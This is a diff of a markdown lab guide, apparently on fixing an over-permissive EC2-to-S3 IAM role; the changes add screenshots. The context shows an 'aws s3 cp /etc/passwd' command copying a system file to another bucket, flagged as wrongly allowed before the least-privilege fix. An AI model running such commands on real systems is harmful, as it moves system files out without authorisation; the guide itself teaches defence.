@@ -80,6 +80,8 @@ You can list all S3 buckets.
 **aws s3 cp /etc/passwd s3://some-other-bucket/**
 **Note: 👉 This should NOT be allowed, but it works.**
 <img width="455" height="260" alt="image" src="https://github.com/user-attachments/assets/6a0997aa-c5ae-43f5-9f8b-54635ab1db0b" />
+<img width="934" height="209" alt="image" src="https://github.com/user-attachments/assets/810b523e-43e2-4fb7-858f-a709d2cca099" />
+
 
 ## STEP 4: Fix with Least Privilege
 **1b. Least-Privilege Policy for EC2 → S3**
@@ -108,6 +110,7 @@ You can list all S3 buckets.
 
 ## Step 4.3 – Re-Test Access
 aws s3 ls
+<img width="455" height="124" alt="image" src="https://github.com/user-attachments/assets/b53f7665-5b3c-4759-b09f-1b64961343e7" />
 
 
 ## ❌ Access denied (GOOD)
